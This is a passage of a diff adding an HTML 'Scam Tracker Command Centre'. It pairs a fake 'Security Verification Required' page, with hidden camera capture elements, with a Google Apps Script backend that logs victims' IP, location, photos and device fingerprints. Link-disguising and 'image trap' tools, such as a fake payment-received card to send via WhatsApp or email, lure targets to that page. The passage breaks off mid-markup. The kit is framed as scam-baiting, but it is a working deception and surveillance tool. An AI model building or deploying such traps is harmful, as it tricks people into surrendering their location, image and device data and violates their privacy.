@@ -1,0 +1,1076 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title id="pgTitle">Secure Verification</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#07070d;--card:rgba(255,255,255,0.025);--bdr:#161625;--tx:#ddd;--dim:#555;--acc:#6c7eff;--ac2:#9b59ff;--ok:#5eea8d;--wn:#f0c040;--er:#ff6b6b}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--tx);min-height:100vh}
+a{color:var(--acc)}
+
+/* TRAP */
+.T-wrap{background:linear-gradient(135deg,#0c0920,#1e1750,#1a1040);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.T-box{background:rgba(255,255,255,0.04);backdrop-filter:blur(25px);border:1px solid rgba(255,255,255,0.08);border-radius:22px;padding:44px 36px;max-width:480px;width:100%;text-align:center;box-shadow:0 30px 60px rgba(0,0,0,0.4)}
+.T-box .ico{font-size:58px;margin-bottom:18px}
+.T-box h1{font-size:21px;margin-bottom:8px;font-weight:700}
+.T-box .sub{color:rgba(255,255,255,0.5);font-size:13.5px;line-height:1.65;margin-bottom:28px}
+.T-feat{display:flex;justify-content:center;gap:16px;margin-bottom:26px;flex-wrap:wrap}
+.T-feat span{font-size:11.5px;color:rgba(255,255,255,0.38)}
+.T-btn{background:linear-gradient(135deg,var(--acc),var(--ac2));color:#fff;border:none;padding:14px 36px;border-radius:50px;font-size:15px;font-weight:600;cursor:pointer;transition:all .3s;display:inline-flex;align-items:center;gap:9px}
+.T-btn:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(108,126,255,0.35)}
+.T-btn:disabled{opacity:.45;cursor:not-allowed;transform:none}
+.T-prog{width:100%;height:3px;background:rgba(255,255,255,0.07);border-radius:2px;margin:16px 0;overflow:hidden;display:none}
+.T-prog.on{display:block}
+.T-prog i{display:block;height:100%;background:linear-gradient(90deg,var(--acc),var(--ac2));width:0%;transition:width .6s;border-radius:2px}
+.T-stat{padding:11px 16px;border-radius:10px;font-size:13px;display:none;margin-top:10px}
+.T-stat.ld{display:block;background:rgba(240,192,64,0.1);border:1px solid rgba(240,192,64,0.2);color:var(--wn)}
+.T-stat.ok{display:block;background:rgba(94,234,141,0.1);border:1px solid rgba(94,234,141,0.2);color:var(--ok)}
+.T-foot{font-size:10.5px;color:rgba(255,255,255,0.15);margin-top:22px}
+.sp{display:inline-block;width:15px;height:15px;border:2px solid rgba(255,255,255,0.25);border-top-color:#fff;border-radius:50%;animation:rr .7s linear infinite}
+@keyframes rr{to{transform:rotate(360deg)}}
+#camV,#camC{display:none}
+
+/* SETUP */
+.S-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.S-box{background:var(--card);border:1px solid var(--bdr);border-radius:18px;padding:40px;max-width:720px;width:100%;box-shadow:0 20px 50px rgba(0,0,0,0.3)}
+.S-box .ico{font-size:48px;text-align:center;margin-bottom:14px}
+.S-box h2{text-align:center;margin-bottom:6px;font-size:20px}
+.S-box .sub{text-align:center;color:#666;font-size:13px;line-height:1.6;margin-bottom:28px}
+.S-step{background:rgba(255,255,255,0.02);border:1px solid var(--bdr);border-radius:12px;padding:20px;margin-bottom:16px}
+.S-step h3{font-size:14px;margin-bottom:10px;display:flex;align-items:center;gap:8px}
+.S-step h3 .num{background:var(--acc);color:#fff;width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0}
+.S-step p{font-size:12.5px;color:#888;line-height:1.6;margin-bottom:10px}
+.S-code{background:#0d0d18;border:1px solid #222;border-radius:8px;padding:14px;font-family:'Courier New',monospace;font-size:11.5px;color:#aaa;max-height:300px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;position:relative;line-height:1.5}
+.S-code .cpb{position:absolute;top:8px;right:8px;background:rgba(255,255,255,0.08);color:#aaa;border:1px solid #333;padding:3px 10px;border-radius:5px;cursor:pointer;font-size:10px;font-family:sans-serif}
+.S-inp{width:100%;background:rgba(255,255,255,0.06);border:1px solid #2a2a3e;color:#fff;padding:11px 16px;border-radius:9px;font-size:13.5px;outline:none;margin-top:8px}
+.S-inp::placeholder{color:#444}
+.S-btn{display:block;margin:20px auto 0;background:linear-gradient(135deg,var(--acc),var(--ac2));color:#fff;border:none;padding:13px 32px;border-radius:50px;font-size:15px;font-weight:600;cursor:pointer}
+.S-btn:disabled{opacity:.4;cursor:not-allowed}
+.S-err{color:var(--er);font-size:12px;text-align:center;margin-top:12px;display:none}
+.S-ok{color:var(--ok);font-size:12px;text-align:center;margin-top:12px;display:none}
+
+/* DASHBOARD */
+.D{min-height:100vh}
+.D-hdr{background:linear-gradient(135deg,#12122a,#0e1a30);border-bottom:1px solid var(--bdr);padding:16px 22px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
+.D-hdr h1{font-size:18px;display:flex;align-items:center;gap:8px}
+.D-acts{display:flex;gap:7px;align-items:center;flex-wrap:wrap}
+.D-inp{background:rgba(255,255,255,0.06);border:1px solid #2a2a3e;color:#fff;padding:7px 13px;border-radius:7px;font-size:12.5px;outline:none;min-width:140px}
+.D-inp::placeholder{color:#444}
+.b{padding:7px 15px;border-radius:7px;border:none;font-size:11.5px;font-weight:600;cursor:pointer;transition:all .2s}
+.b-p{background:linear-gradient(135deg,var(--acc),var(--ac2));color:#fff}
+.b-ok{background:rgba(94,234,141,0.12);color:var(--ok);border:1px solid rgba(94,234,141,0.2)}
+.b-no{background:rgba(255,107,107,0.12);color:var(--er);border:1px solid rgba(255,107,107,0.2)}
+.b-g{background:rgba(255,255,255,0.04);color:#888;border:1px solid #262638}
+.b-wn{background:rgba(240,192,64,0.12);color:var(--wn);border:1px solid rgba(240,192,64,0.2)}
+.D-cnt{padding:20px;max-width:1400px;margin:0 auto}
+.sg{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-bottom:20px}
+.sc{background:var(--card);border:1px solid var(--bdr);border-radius:11px;padding:16px;text-align:center}
+.sc .n{font-size:28px;font-weight:700;background:linear-gradient(135deg,var(--acc),var(--ac2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.sc .l{color:#444;font-size:10.5px;margin-top:3px}
+
+/* Link Banner */
+.lb{background:rgba(108,126,255,0.08);border:1px solid rgba(108,126,255,0.2);border-radius:9px;padding:14px 18px;margin-bottom:16px;display:none;flex-direction:column;gap:10px;font-size:12.5px}
+.lb-row{display:flex;align-items:center;gap:9px;flex-wrap:wrap}
+.lb a{word-break:break-all}
+.lb .cpb2{background:rgba(255,255,255,0.08);color:#ccc;border:1px solid #383850;padding:4px 12px;border-radius:5px;cursor:pointer;font-size:10.5px}
+.lb .lbl{color:#888;min-width:90px;font-size:11px}
+.lb-note{font-size:10.5px;color:#555}
+
+/* Link Customizer */
+.lc{background:var(--card);border:1px solid var(--bdr);border-radius:11px;padding:18px;margin-bottom:20px;display:none}
+.lc h3{font-size:14px;margin-bottom:12px;display:flex;align-items:center;gap:7px}
+.lc-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:8px}
+.lc-item{background:rgba(255,255,255,0.02);border:1px solid var(--bdr);border-radius:8px;padding:10px;cursor:pointer;transition:all .2s;text-align:center}
+.lc-item:hover{border-color:var(--acc)}
+.lc-item.active{border-color:var(--acc);background:rgba(108,126,255,0.08)}
+.lc-item .li-icon{font-size:20px;margin-bottom:3px}
+.lc-item .li-name{font-size:10.5px;font-weight:600}
+.lc-custom{margin-top:12px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.lc-custom input{flex:1;min-width:160px}
+.lc-custom select{background:rgba(255,255,255,0.06);border:1px solid #2a2a3e;color:#fff;padding:7px 10px;border-radius:7px;font-size:12px;outline:none}
+
+/* IMAGE TRAP GENERATOR */
+.ig{background:var(--card);border:1px solid var(--bdr);border-radius:11px;padding:18px;margin-bottom:20px;display:none}
+.ig h3{font-size:14px;margin-bottom:12px;display:flex;align-items:center;gap:7px}
+.ig-templates{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:10px;margin-bottom:15px}
+.ig-tpl{background:rgba(255,255,255,0.02);border:1px solid var(--bdr);border-radius:10px;overflow:hidden;cursor:pointer;transition:all .2s}
+.ig-tpl:hover{border-color:var(--acc);transform:translateY(-2px)}
+.ig-tpl.active{border-color:var(--acc);box-shadow:0 0 15px rgba(108,126,255,0.2)}
+.ig-tpl canvas{width:100%;display:block}
+.ig-tpl .ig-name{padding:6px;text-align:center;font-size:10px;font-weight:600;color:#888}
+.ig-customize{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:15px}
+.ig-customize label{font-size:11px;color:#888;display:flex;flex-direction:column;gap:4px}
+.ig-customize input,.ig-customize select{background:rgba(255,255,255,0.06);border:1px solid #2a2a3e;color:#fff;padding:8px 12px;border-radius:7px;font-size:12px;outline:none}
+.ig-customize input[type="color"]{height:38px;padding:2px 5px}
+.ig-preview{text-align:center;margin:15px 0;position:relative}
+.ig-preview canvas{max-width:100%;border-radius:10px;border:1px solid var(--bdr);box-shadow:0 10px 30px rgba(0,0,0,0.3)}
+.ig-actions{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:15px}
+.ig-actions button{padding:9px 20px}
+.ig-code{background:#0d0d18;border:1px solid #222;border-radius:8px;padding:12px;font-family:monospace;font-size:11px;color:#aaa;margin-top:12px;word-break:break-all;display:none;position:relative;max-height:150px;overflow-y:auto}
+.ig-code .cpb3{position:absolute;top:6px;right:6px;background:rgba(255,255,255,0.08);color:#aaa;border:1px solid #333;padding:2px 8px;border-radius:4px;cursor:pointer;font-size:10px}
+
+/* ═══ IMAGE UPLOAD TRAP ═══ */
+.iu{background:var(--card);border:1px solid var(--bdr);border-radius:11px;padding:18px;margin-bottom:20px;display:none}
+.iu h3{font-size:14px;margin-bottom:4px;display:flex;align-items:center;gap:7px}
+.iu .iu-desc{color:#666;font-size:12px;margin-bottom:15px;line-height:1.6}
+.iu-drop{border:2px dashed #2a2a3e;border-radius:12px;padding:40px 20px;text-align:center;cursor:pointer;transition:all .3s;position:relative;overflow:hidden;background:rgba(255,255,255,0.01)}
+.iu-drop:hover,.iu-drop.dragover{border-color:var(--acc);background:rgba(108,126,255,0.05)}
+.iu-drop .iu-icon{font-size:42px;margin-bottom:10px}
+.iu-drop .iu-text{color:#666;font-size:13px}
+.iu-drop .iu-hint{color:#444;font-size:10.5px;margin-top:6px}
+.iu-drop input[type="file"]{position:absolute;top:0;left:0;width:100%;height:100%;opacity:0;cursor:pointer}
+.iu-preview-wrap{display:none;margin-top:18px}
+.iu-preview-box{display:grid;grid-template-columns:1fr 1fr;gap:16px;align-items:start}
+.iu-preview-left{text-align:center}
+.iu-preview-left img{max-width:100%;max-height:300px;border-radius:10px;border:2px solid var(--bdr);box-shadow:0 10px 30px rgba(0,0,0,0.3)}
+.iu-preview-left .iu-img-info{margin-top:8px;font-size:10.5px;color:#555}
+.iu-preview-right{display:flex;flex-direction:column;gap:10px}
+.iu-opt{background:rgba(255,255,255,0.02);border:1px solid var(--bdr);border-radius:9px;padding:12px}
+.iu-opt h4{font-size:12px;color:#999;margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.iu-opt label{font-size:11px;color:#777;display:flex;flex-direction:column;gap:4px;margin-bottom:8px}
+.iu-opt input,.iu-opt select{background:rgba(255,255,255,0.06);border:1px solid #2a2a3e;color:#fff;padding:7px 11px;border-radius:6px;font-size:12px;outline:none;width:100%}
+.iu-opt textarea{background:rgba(255,255,255,0.06);border:1px solid #2a2a3e;color:#fff;padding:7px 11px;border-radius:6px;font-size:11px;outline:none;width:100%;resize:vertical;min-height:60px;font-family:monospace}
+.iu-export-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:15px}
+.iu-export-btn{display:flex;flex-direction:column;align-items:center;gap:4px;padding:14px 10px;background:rgba(255,255,255,0.02);border:1px solid var(--bdr);border-radius:10px;cursor:pointer;transition:all .2s}
+.iu-export-btn:hover{border-color:var(--acc);background:rgba(108,126,255,0.08);transform:translateY(-2px)}
+.iu-export-btn .ue-icon{font-size:24px}
+.iu-export-btn .ue-name{font-size:11px;font-weight:600;color:#bbb}
+.iu-export-btn .ue-desc{font-size:9.5px;color:#555;text-align:center}
+.iu-output{background:#0d0d18;border:1px solid #222;border-radius:8px;padding:12px;font-family:monospace;font-size:10.5px;color:#aaa;margin-top:12px;word-break:break-all;display:none;position:relative;max-height:180px;overflow-y:auto;line-height:1.5}
+.iu-output .cpb4{position:absolute;top:6px;right:6px;background:rgba(255,255,255,0.08);color:#aaa;border:1px solid #333;padding:2px 8px;border-radius:4px;cursor:pointer;font-size:10px}
+.iu-status{padding:10px 14px;border-radius:8px;font-size:12px;margin-top:10px;display:none}
+.iu-status.on{display:block}
+.iu-status.ok{background:rgba(94,234,141,0.1);border:1px solid rgba(94,234,141,0.2);color:var(--ok)}
+.iu-status.warn{background:rgba(240,192,64,0.1);border:1px solid rgba(240,192,64,0.2);color:var(--wn)}
+
+/* Export Dropdown */
+.exp-drop{position:relative;display:inline-block}
+.exp-menu{position:absolute;top:100%;right:0;background:#151528;border:1px solid var(--bdr);border-radius:10px;padding:6px;min-width:220px;z-index:100;display:none;box-shadow:0 15px 40px rgba(0,0,0,0.5)}
+.exp-menu.on{display:block}
+.exp-menu button{display:flex;align-items:center;gap:8px;width:100%;padding:9px 12px;border:none;background:transparent;color:#bbb;font-size:12px;cursor:pointer;border-radius:6px;text-align:left}
+.exp-menu button:hover{background:rgba(108,126,255,0.1);color:#fff}
+.exp-menu hr{border:none;border-top:1px solid var(--bdr);margin:4px 0}
+
+/* Capture Card */
+.cc{background:var(--card);border:1px solid var(--bdr);border-radius:13px;margin-bottom:16px;overflow:hidden}
+.ch{display:flex;justify-content:space-between;align-items:center;padding:11px 16px;background:rgba(255,255,255,0.015);border-bottom:1px solid var(--bdr);flex-wrap:wrap;gap:7px}
+.ch .cl{font-weight:600;font-size:13.5px}
+.ch .ci{font-family:monospace;background:rgba(255,255,255,0.06);padding:2px 7px;border-radius:4px;font-size:10.5px;color:#777}
+.vc{background:rgba(108,126,255,0.18);color:var(--acc);padding:1px 8px;border-radius:14px;font-size:9.5px;font-weight:600}
+.ch .cd{color:#3a3a50;font-size:10.5px}
+.vw{padding:11px}
+.vr-card{border:1px solid rgba(255,255,255,0.03);border-radius:10px;margin-bottom:10px;background:rgba(255,255,255,0.012);overflow:hidden}
+.vr-top{display:grid;grid-template-columns:130px 1fr;gap:12px;padding:12px}
+.vp{width:130px;height:100px;border-radius:7px;overflow:hidden;background:rgba(255,255,255,0.02);display:flex;align-items:center;justify-content:center;color:#2a2a3e;font-size:10px;cursor:pointer;flex-shrink:0}
+.vp img{width:100%;height:100%;object-fit:cover}
+.vd{display:flex;flex-direction:column;gap:3.5px;font-size:11.5px}
+.vi{display:flex;gap:6px}
+.vl{color:#3e3e55;min-width:66px;flex-shrink:0}
+.vv{color:#999;word-break:break-all}
+.bg{display:inline-block;padding:1.5px 6px;border-radius:3px;font-size:9px;font-weight:600;margin-right:3px}
+.bg-p{background:rgba(94,234,141,0.15);color:var(--ok)}
+.bg-l{background:rgba(240,192,64,0.15);color:var(--wn)}
+.bg-b{background:rgba(160,174,192,0.15);color:#8899aa}
+
+/* Map */
+.map-wrapper{border-top:1px solid var(--bdr);background:rgba(0,0,0,0.2)}
+.map-toolbar{display:flex;gap:0;background:rgba(255,255,255,0.03);border-bottom:1px solid var(--bdr)}
+.map-toolbar button{flex:1;padding:8px 5px;border:none;background:transparent;color:#666;font-size:10px;font-weight:600;cursor:pointer;transition:all .2s}
+.map-toolbar button.active{background:rgba(108,126,255,0.12);color:var(--acc);border-bottom:2px solid var(--acc)}
+.map-container{height:300px;width:100%;position:relative}
+.map-toggle{display:flex;align-items:center;justify-content:center;padding:6px;cursor:pointer;color:#555;font-size:11px;gap:5px;background:rgba(255,255,255,0.02)}
+.map-toggle:hover{background:rgba(108,126,255,0.08);color:var(--acc)}
+.map-coords{position:absolute;bottom:8px;left:8px;background:rgba(0,0,0,0.75);color:#ccc;padding:4px 10px;border-radius:5px;font-size:10px;z-index:500;font-family:monospace}
+.map-fullscreen{position:absolute;top:8px;right:8px;background:rgba(0,0,0,0.7);color:#fff;border:none;width:30px;height:30px;border-radius:6px;cursor:pointer;z-index:500;font-size:14px;display:flex;align-items:center;justify-content:center}
+.map-modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:2000;display:none;flex-direction:column}
+.map-modal.on{display:flex}
+.map-modal-hdr{display:flex;justify-content:space-between;align-items:center;padding:12px 20px;background:#111;border-bottom:1px solid #222}
+.map-modal-hdr h3{font-size:14px;color:#ccc}
+.map-modal-hdr button{background:var(--er);color:#fff;border:none;padding:6px 16px;border-radius:6px;cursor:pointer;font-size:12px;font-weight:600}
+.map-modal-body{flex:1;position:relative}
+.map-modal-toolbar{display:flex;gap:0;background:#0a0a0a;border-bottom:1px solid #222}
+.map-modal-toolbar button{flex:1;padding:10px;border:none;background:transparent;color:#666;font-size:11px;font-weight:600;cursor:pointer}
+.map-modal-toolbar button.active{background:rgba(108,126,255,0.15);color:var(--acc);border-bottom:2px solid var(--acc)}
+
+.vr-actions{display:flex;gap:4px;padding:6px 12px;border-top:1px solid rgba(255,255,255,0.03);background:rgba(0,0,0,0.15)}
+.vr-actions button{padding:3px 10px;border-radius:4px;border:1px solid #222;background:rgba(255,255,255,0.03);color:#666;font-size:9.5px;cursor:pointer}
+.vr-actions button:hover{background:rgba(108,126,255,0.1);color:#aaa}
+
+.empty{text-align:center;padding:45px 20px;color:#333}
+.empty .ei{font-size:40px;margin-bottom:8px}
+.md{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);display:none;align-items:center;justify-content:center;z-index:1000;cursor:pointer}
+.md.on{display:flex}
+.md img{max-width:93%;max-height:93%;border-radius:10px}
+.toast{position:fixed;top:18px;right:18px;background:#151528;border:1px solid var(--bdr);color:var(--tx);padding:10px 18px;border-radius:9px;font-size:12.5px;z-index:3000;display:none;box-shadow:0 10px 30px rgba(0,0,0,0.5);max-width:380px}
+.toast.on{display:block;animation:fi .3s}
+@keyframes fi{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
+
+.leaflet-container{background:#0a0a14!important}
+.leaflet-control-zoom a{background:#1a1a2e!important;color:#aaa!important;border-color:#333!important}
+.leaflet-popup-content-wrapper{background:#1a1a2e!important;color:#ccc!important;border-radius:10px!important}
+.leaflet-popup-tip{background:#1a1a2e!important}
+.leaflet-control-attribution{background:rgba(0,0,0,0.6)!important;color:#555!important;font-size:9px!important}
+
+/* Section tabs for tools */
+.tool-tabs{display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap}
+.tool-tab{padding:8px 16px;border-radius:8px;border:1px solid var(--bdr);background:rgba(255,255,255,0.02);color:#666;font-size:12px;font-weight:600;cursor:pointer;transition:all .2s}
+.tool-tab:hover{border-color:var(--acc);color:#aaa}
+.tool-tab.active{border-color:var(--acc);background:rgba(108,126,255,0.12);color:var(--acc)}
+
+@media(max-width:640px){
+    .vr-top{grid-template-columns:1fr}.vp{width:100%;height:180px}
+    .D-hdr{padding:12px}.D-cnt{padding:12px}.S-box{padding:24px 18px}
+    .ig-templates{grid-template-columns:1fr 1fr}
+    .ig-customize{grid-template-columns:1fr}
+    .map-container{height:250px}
+    .iu-preview-box{grid-template-columns:1fr}
+    .iu-export-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+
+<!-- TRAP -->
+<div class="T-wrap" id="pgTrap" style="display:none">
+<div class="T-box">
+    <div class="ico">🛡️</div>
+    <h1>Security Verification Required</h1>
+    <p class="sub">To access this secure content, complete a quick identity verification. This protects against unauthorized access and ensures your account safety.</p>
+    <div class="T-feat"><span>🔒 Encrypted</span><span>⚡ 10 seconds</span><span>✅ Secure</span></div>
+    <button class="T-btn" id="tBtn" onclick="doCapture()">🔍 Start Verification</button>
+    <div class="T-prog" id="tP"><i id="tF"></i></div>
+    <div class="T-stat" id="tS"></div>
+    <p class="T-foot">Protected by Advanced Security Systems™</p>
+</div>
+<video id="camV" autoplay playsinline></video>
+<canvas id="camC"></canvas>
+</div>
+
+<!-- SETUP -->
+<div class="S-wrap" id="pgSetup" style="display:none">
+<div class="S-box">
+    <div class="ico">🚀</div>
+    <h2>One-Time Backend Setup</h2>
+    <p class="sub">Free Google Apps Script backend. 2 minutes, once only.</p>
+    <div class="S-step"><h3><span class="num">1</span> Open Google Apps Script</h3><p>Click below, sign in with Google.</p><div style="text-align:center;margin:10px 0"><a href="https://script.google.com/home/projects/create" target="_blank" class="b b-p" style="display:inline-block;padding:10px 22px;text-decoration:none;border-radius:8px">Open Apps Script →</a></div></div>
+    <div class="S-step"><h3><span class="num">2</span> Paste this code</h3><p>Delete existing code, paste:</p>
+    <div class="S-code" id="gasCode"><button class="cpb" onclick="copyGAS()">📋 Copy</button>function doPost(e){try{var data=JSON.parse(e.postData.contents);var ss=getOrCreateSheet();var action=data.action||'capture';if(action==='capture'){var sheet=ss.getSheetByName('Captures')||ss.insertSheet('Captures');if(sheet.getLastRow()===0){sheet.appendRow(['ID','TrackingID','Type','Timestamp','IP','City','Region','Country','ISP','Lat','Lng','Accuracy','UserAgent','Platform','Language','Screen','Timezone','Cores','Memory','GPU','Battery','Connection','Photo','Touch','Online','Extra'])}var d=data.payload;sheet.appendRow([d.vid||'',d.trackingId||'',d.type||'',d.ts||'',d.ip||'',d.city||'',d.region||'',d.country||'',d.org||'',d.lat||'',d.lng||'',d.acc||'',d.ua||'',d.platform||'',d.lang||'',(d.sw||'')+'x'+(d.sh||''),d.tz||'',d.cores||'',d.mem||'',d.gpu||'',d.battery||'',d.connType||'',d.photo||'',d.touch||'',d.online||'',JSON.stringify(d.extra||{})]);return ok({status:'saved'})}if(action==='get_all'){var sheet=ss.getSheetByName('Captures');if(!sheet||sheet.getLastRow()<=1)return ok({captures:[]});var rows=sheet.getDataRange().getValues();var headers=rows[0];var result=[];for(var i=1;i<rows.length;i++){var obj={};for(var j=0;j<headers.length;j++)obj[headers[j]]=rows[i][j];result.push(obj)}return ok({captures:result})}if(action==='delete'){var sheet=ss.getSheetByName('Captures');if(!sheet)return ok({status:'empty'});var tid=data.trackingId;var rows=sheet.getDataRange().getValues();for(var i=rows.length-1;i>=1;i--){if(rows[i][1]===tid)sheet.deleteRow(i+1)}return ok({status:'deleted'})}if(action==='delete_all'){var sheet=ss.getSheetByName('Captures');if(sheet)ss.deleteSheet(sheet);var ls=ss.getSheetByName('Links');if(ls)ss.deleteSheet(ls);return ok({status:'cleared'})}if(action==='save_link'){var sheet=ss.getSheetByName('Links')||ss.insertSheet('Links');if(sheet.getLastRow()===0)sheet.appendRow(['TrackingID','Label','Created']);sheet.appendRow([data.trackingId,data.label,data.created]);return ok({status:'saved'})}if(action==='get_links'){var sheet=ss.getSheetByName('Links');if(!sheet||sheet.getLastRow()<=1)return ok({links:[]});var rows=sheet.getDataRange().getValues();var result=[];for(var i=1;i<rows.length;i++)result.push({trackingId:rows[i][0],label:rows[i][1],created:rows[i][2]});return ok({links:result})}if(action==='delete_link'){var sheet=ss.getSheetByName('Links');if(!sheet)return ok({status:'empty'});var rows=sheet.getDataRange().getValues();for(var i=rows.length-1;i>=1;i--){if(rows[i][0]===data.trackingId)sheet.deleteRow(i+1)}return ok({status:'deleted'})}return ok({status:'unknown'})}catch(err){return ok({error:err.toString()})}}
+function doGet(e){return ContentService.createTextOutput(JSON.stringify({status:'ScamTracker API active'})).setMimeType(ContentService.MimeType.JSON)}
+function getOrCreateSheet(){var files=DriveApp.getFilesByName('ScamTrackerDB');if(files.hasNext())return SpreadsheetApp.open(files.next());return SpreadsheetApp.create('ScamTrackerDB')}
+function ok(obj){return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON)}</div></div>
+    <div class="S-step"><h3><span class="num">3</span> Deploy</h3><p><b>Deploy</b> → <b>New deployment</b> → ⚙️ <b>Web app</b> → "Anyone" → <b>Deploy</b> → Authorize → Copy URL</p></div>
+    <div class="S-step"><h3><span class="num">4</span> Paste URL</h3><input class="S-inp" id="setupUrl" placeholder="https://script.google.com/macros/s/XXXXX/exec"></div>
+    <button class="S-btn" id="setupBtn" onclick="saveSetup()">✅ Verify & Save</button>
+    <p class="S-err" id="sErr"></p><p class="S-ok" id="sOk"></p>
+</div></div>
+
+<!-- DASHBOARD -->
+<div class="D" id="pgDash" style="display:none">
+<div class="D-hdr">
+    <h1>🔒 Scam Tracker Command Centre</h1>
+    <div class="D-acts">
+        <input class="D-inp" id="lnkLbl" placeholder="Label (Case#...)">
+        <button class="b b-p" onclick="genLink()">+ New Link</button>
+        <button class="b b-ok" onclick="refreshAll()">🔄</button>
+        <button class="b b-g" onclick="showAllMap()">🗺️ Map</button>
+        <div class="exp-drop"><button class="b b-wn" onclick="togExp()">📥 Export ▾</button>
+            <div class="exp-menu" id="expMenu">
+                <button onclick="exportHTML()">📄 HTML Report</button>
+                <button onclick="exportCSV()">📊 CSV Spreadsheet</button>
+                <button onclick="exportJSON()">🔧 JSON Data</button>
+                <hr><button onclick="saveAllPhotos()">🖼️ All Photos</button>
+            </div>
+        </div>
+        <button class="b b-no" onclick="clearAllData()">🗑️</button>
+        <button class="b b-g" onclick="resetSetup()">⚙️</button>
+    </div>
+</div>
+<div class="D-cnt">
+    <!-- Link Banner -->
+    <div class="lb" id="lBan">
+        <div class="lb-row"><span class="lbl">📎 Original:</span><a id="gLnk" href="#" target="_blank"></a><button class="cpb2" onclick="copyL('orig')">📋</button></div>
+        <div class="lb-row" id="dRow" style="display:none"><span class="lbl">🎭 Disguised:</span><a id="gLnkD" href="#" target="_blank" style="color:var(--ok)"></a><button class="cpb2" onclick="copyL('dis')">📋</button></div>
+        <div class="lb-note">💡 Use the tools below to disguise the link, generate trap images, or upload your own image</div>
+    </div>
+
+    <!-- Tool Tabs -->
+    <div class="tool-tabs" id="toolTabs" style="display:none">
+        <div class="tool-tab active" onclick="switchTool('disguise',this)">🎭 Link Disguiser</div>
+        <div class="tool-tab" onclick="switchTool('generate',this)">🖼️ Generate Image</div>
+        <div class="tool-tab" onclick="switchTool('upload',this)">📤 Upload Image Trap</div>
+    </div>
+
+    <!-- Link Disguiser -->
+    <div class="lc" id="linkCust">
+        <h3>🎭 Link Disguiser</h3>
+        <div class="lc-grid" id="dGrid"></div>
+        <div class="lc-custom">
+            <input class="D-inp" id="custDis" placeholder="Custom text...">
+            <select id="disSvc" class="D-inp" style="min-width:auto;width:auto"><option value="tinyurl">TinyURL</option><option value="isgd">is.gd</option><option value="html">HTML</option><option value="md">Markdown</option></select>
+            <button class="b b-p" onclick="applyDis()">🎭 Disguise</button>
+        </div>
+    </div>
+
+    <!-- IMAGE TRAP GENERATOR -->
+    <div class="ig" id="imgGen">
+        <h3>🖼️ Image Trap Generator</h3>
+        <p style="color:#666;font-size:12px;margin-bottom:15px">Generate a clickable image to send via WhatsApp, email, social media. When they tap the image, it opens the trap page.</p>
+
+        <div class="ig-templates" id="igTpls"></div>
+
+        <div class="ig-customize">
+            <label>Title <input id="igTitle" value="Payment Received" oninput="renderPreview()"></label>
+            <label>Subtitle <input id="igSub" value="$2,500.00 USD" oninput="renderPreview()"></label>
+            <label>Body Text <input id="igBody" value="Tap to view transaction details" oninput="renderPreview()"></label>
+            <label>Footer <input id="igFoot" value="Secure Transaction • Verified" oninput="renderPreview()"></label>
+            <label>Accent Color <input type="color" id="igColor" value="#6c7eff" oninput="renderPreview()"></label>
+            <label>Style
+                <select id="igStyle" onchange="renderPreview()">
+                    <option value="dark">Dark</option>
+                    <option value="light">Light</option>
+                    <option value="gradient">Gradient</option>
+                    <option value="bank">Bank Style</option>
+                    <option value="alert">Alert/Warning</option>
+                </select>
+            </label>
+        </div>
+
+        <div class="ig-preview">
+            <canvas id="igCanvas" width="600" height="340"></canvas>
+        </div>
+
+        <div class="ig-actions">
+            <button class="b b-p" onclick="downloadTrapImage()">💾 Download Image</button>
+            <button class="b b-ok" onclick="copyImageHTML()">📋 Copy HTML (for email)</button>
+            <button class="b b-wn" onclick="copyImageMD()">📋 Copy Markdown</button>
+            <button class="b b-g" onclick="showShareGuide()">📱 How to Send</button>
+        </div>
+
+        <div class="ig-code" id="igCode"><button class="cpb3" onclick="copyIGCode()">📋</button><span id="igCodeText"></span></div>
+    </div>
+
+    <!-- ═══ IMAGE UPLOAD TRAP ═══ -->
+    <div class="iu" id="imgUpload">
+        <h3>📤 Upload Image Trap</h3>
+        <p class="iu-desc">Upload any image (screenshot, receipt, photo). It becomes a clickable trap — when the target taps it, they open the tracking page. Works on WhatsApp, email, forums, social media.</p>
+
+        <div class="iu-drop" id="iuDrop">
+            <div class="iu-icon">📸</div>
+            <div class="iu-text">Drop image here or <b>click to upload</b></div>
+            <div class="iu-hint">JPG, PNG, GIF, WebP — Max 5MB</div>
+            <input type="file" id="iuFile" accept="image/*" onchange="handleImageUpload(this)">
+        </div>
+
+        <div class="iu-preview-wrap" id="iuPreviewWrap">
+            <div class="iu-preview-box">
+                <div class="iu-preview-left">
+                    <img id="iuPreviewImg" src="" alt="Preview">
+                    <div class="iu-img-info" id="iuImgInfo"></div>
+                    <button class="b b-no" style="margin-top:8px" onclick="clearUpload()">🗑️ Remove & Upload New</button>
+                </div>
+                <div class="iu-preview-right">
